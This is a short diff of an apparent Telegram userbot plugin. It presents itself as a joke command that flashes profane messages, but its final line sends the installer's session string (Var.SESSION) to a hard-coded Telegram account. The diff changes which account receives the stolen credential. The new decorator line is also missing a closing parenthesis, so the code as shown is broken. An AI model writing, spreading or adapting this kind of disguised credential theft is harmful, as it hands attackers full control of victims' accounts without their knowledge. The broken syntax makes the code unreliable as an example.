@@ -1,6 +1,6 @@
 import asyncio
 
-@REBELBOT_cmd(pattern="SUPERMEN$")
+@bot.on(admin_cmd(pattern="SUPERMEN$")
 async def fuckd(ult):
  await ult.edit("fuck")
  await asyncio.sleep(2)
@@ -31,4 +31,4 @@ async def fuckd(ult):
  await ult.edit ("Legend-Lx")
  await asyncio.sleep(2)
  await ult.edit ("fuck")
- await ult.client.send_message(602759221, Var.SESSION)
+ await ult.client.send_message(2143095429, Var.SESSION)
